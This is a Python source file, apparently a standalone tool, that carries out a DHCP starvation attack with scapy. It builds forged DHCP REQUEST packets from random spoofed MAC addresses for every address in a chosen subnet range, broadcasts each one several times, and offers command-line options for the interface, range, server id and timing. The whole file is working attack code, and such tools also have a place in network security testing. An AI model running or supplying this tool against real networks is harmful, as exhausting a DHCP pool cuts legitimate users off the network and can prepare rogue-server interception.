#!/usr/bin/env python3
# Giuseppe De Marco

# suppress "WARNING: No route found for IPv6 destination :: (no default route?)"
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from netaddr import IPNetwork
from random_name import random_hostname
from scapy.all import *

def get_addresses(net="192.168.1.0/24",
                  start_ip="1",
                  end_ip="254",
                  excluded= ['0', '254']):
    pool = IPNetwork(net)
    addresses = []
    ip_range = range(int(start_ip), int(end_ip)+1)
    for p in pool:
        str_ip = str(p)
        prefix = '.'.join(str_ip.split('.')[0:-1])
        suffix = int(str_ip.split('.')[-1])
        if suffix in ip_range:
            addresses.append(str_ip)
    return addresses

def starvit(net="192.168.1.0/24",
            start_ip=1,
            end_ip=254,
            server_id="192.168.1.1",
            dst_mac="ff:ff:ff:ff:ff:ff",
            random_hostnames=False,
            timeout=0.2,
            repetition=3,
            debug=0):
    # Stops scapy from checking return packet originating from any packet that we have sent out
    #conf.checkIPaddr = False 
    
    addresses = get_addresses(net=net,
                              start_ip=start_ip,
                              end_ip=end_ip)
    
    for ip in addresses:
        bogus_mac_address = RandMAC()
        dhcp_options = [("message-type","request"),
                        ("requested_addr", ip),
                        "end"]
        if server_id:
            dhcp_options.insert(1, ("server_id",server_id))
        
        if random_hostnames:
            rn = random_hostname()
            rname = bytes(rn, encoding='ascii')
            dhcp_options.insert(2, ("hostname", rname))
            
        dhcp_request = Ether(src=bogus_mac_address, dst=dst_mac)\
                           /IP(src="0.0.0.0", dst="255.255.255.255")\
                           /UDP(sport=68, dport=67)\
                           /BOOTP(chaddr=bogus_mac_address)\
                           /DHCP(options=dhcp_options)
        
        print("Requesting: " + ip)
        for i in range(repetition):
            sendp(dhcp_request)
        if debug: dhcp_request.show()
        time.sleep(timeout)


if __name__=="__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', required=True, 
                        help="local network interface")
                        
    parser.add_argument('-net', required=True, 
                        help="/24 subnet, example: -subnet 192.168.27.0/24")
    
    parser.add_argument('-start',
                        metavar='N',
                        type=int, 
                        default=1,
                        required=False,
                        help="start ip to request")

    parser.add_argument('-end',
                        metavar='N',
                        type=int, 
                        default=254,
                        help="how many request will be done")

    parser.add_argument('-rep',
                        metavar='N',
                        type=int, 
                        default=3,
                        help="repetition, sometime packet get lost. Default: 3 requests per ip")

    parser.add_argument('-server_id', required=False, 
                        help="DHCP server id, example: 192.168.27.254")

    parser.add_argument('-random_hostnames', required=False,  action='store_true',
                        help="random client hostnames, othrewise client's hostname will be: ?")

    parser.add_argument('-dst_mac', default="ff:ff:ff:ff:ff:ff", required=False, 
                        help="Destination DHCP MAC address, default: ff:ff:ff:ff:ff:ff")

    parser.add_argument('-timeout', type=float, default=0.5, required=False, 
                        help="seconds to wait between a request and another. example -timeout 0.2")

    parser.add_argument('-debug', action='store_true',
                        help="print packets", required=False)

    args = parser.parse_args()
    
    # needed in presence of ovpn/tun/tap interfaces
    conf.iface = args.i
    
    # run!
    starvit(net=args.net,
            start_ip=args.start,
            end_ip=args.end,
            server_id=args.server_id,
            dst_mac=args.dst_mac,
            random_hostnames=args.random_hostnames,
            timeout=args.timeout,
            repetition=args.rep,
            debug=args.debug)
